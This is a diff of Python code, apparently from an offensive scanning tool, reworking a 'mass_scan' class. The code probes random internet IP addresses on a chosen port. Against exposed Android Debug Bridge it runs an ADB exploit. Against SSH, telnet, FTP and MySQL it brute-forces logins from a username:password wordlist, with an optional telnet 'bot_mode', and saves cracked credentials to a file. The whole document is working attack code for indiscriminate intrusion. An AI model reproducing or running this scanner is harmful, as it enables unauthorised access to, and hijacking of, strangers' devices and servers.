@@ -54,65 +54,73 @@ class mass_scan:
    t.daemon=True
    t.start()
  def scan(self):
-  time.sleep(1)
-  while True:
-   try:
-    if self.stop==True:
-         break
-    if self.ip_range==None:
-     ip=getip()
-    else:
-     ip=self.ip_range.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
-    i=False
+  try:
+   time.sleep(1)
+   while True:
     try:
-     so=socket.socket()
-     so.settimeout(self.timeout)
-     so.connect((ip,self.port))
-     i=True
-     so.close()
-    except:
-     pass
-    if self.stop==True:
+     if self.stop==True:
          break
-    if i==True:
-     if self.protocol=="adb":
-      q=adb_exploit(ip,timeout=self.timeout,p=self.port)
-      if q==True:
-       res="adb:{}:{}::".format(ip,self.port)
-       write_file(res,self.file_name)
-       self.result.append(res)
-       if self.logs==True:
-         print(res)
+     if self.ip_range==None:
+      ip=getip()
      else:
-      if self.protocol=="ssh":
-       func=ssh
-      elif self.protocol=="telnet":
-       func=telnet
-      elif self.protocol=="ftp":
-       func=ftp
-      elif self.protocol=="mysql":
-       func=mysql
-      for x in self.word_list:
-       if self.stop==True:
+      ip=self.ip_range.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
+     i=False
+     try:
+      so=socket.socket()
+      so.settimeout(self.timeout)
+      so.connect((ip,self.port))
+      i=True
+      so.close()
+     except:
+      pass
+     if self.stop==True:
          break
-       try:
-        username=x.split(':')[0]
-        password=x.split(':')[1]
-        if self.protocol=="telnet" and self.telnet_bots==True:
-         q=func(ip,username,password,timeout=self.timeout,p=self.port,bot_mode=True)
-        else:
-         q=func(ip,username,password,timeout=self.timeout,p=self.port)
-        if q==True:
-         res="{},{},{},{},{}".format(self.protocol,ip,self.port,username,password)
-         write_file(res,self.file_name)
-         self.result.append(res)
-         if self.logs==True:
-          print(res)
+     if i==True:
+      if self.protocol=="adb":
+       q=adb_exploit(ip,timeout=self.timeout,p=self.port)
+       if q==True:
+        res="adb:{}:{}::".format(ip,self.port)
+        write_file(res,self.file_name)
+        self.result.append(res)
+        if self.logs==True:
+         print(res)
+      else:
+       if self.protocol=="ssh":
+        func=ssh
+       elif self.protocol=="telnet":
+        func=telnet
+       elif self.protocol=="ftp":
+        func=ftp
+       elif self.protocol=="mysql":
+        func=mysql
+       for x in self.word_list:
+        if self.stop==True:
          break
-       except:
+        try:
+         username=x.split(':')[0]
+         password=x.split(':')[1]
+         if self.protocol=="telnet" and self.telnet_bots==True:
+          q=func(ip,username,password,timeout=self.timeout,p=self.port,bot_mode=True)
+         else:
+          q=func(ip,username,password,timeout=self.timeout,p=self.port)
+         if q==True:
+          res="{},{},{},{},{}".format(self.protocol,ip,self.port,username,password)
+          write_file(res,self.file_name)
+          self.result.append(res)
+          if self.logs==True:
+           print(res)
+          break
+        except:
+         pass  
+    except:
         pass
-   except:
-        pass
+   self.kill()
+  except:
+   pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
